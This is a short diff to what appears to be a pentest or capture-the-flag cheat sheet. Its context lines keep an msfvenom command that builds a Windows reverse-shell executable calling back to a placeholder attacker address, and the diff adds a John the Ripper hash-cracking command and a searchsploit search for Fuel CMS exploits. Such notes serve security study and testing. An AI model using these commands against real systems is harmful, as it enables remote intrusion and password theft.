@@ -73,3 +73,19 @@ A command-line payload generation tool
 ```console
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
 ```
+
+## john
+
+Brute force hash pwd
+
+```console
+john --wordlist=greedykeys.txt hash.txt
+```
+
+## searchsploit
+
+Search ExploitDB
+
+```console
+searchsploit fuel cms
+```
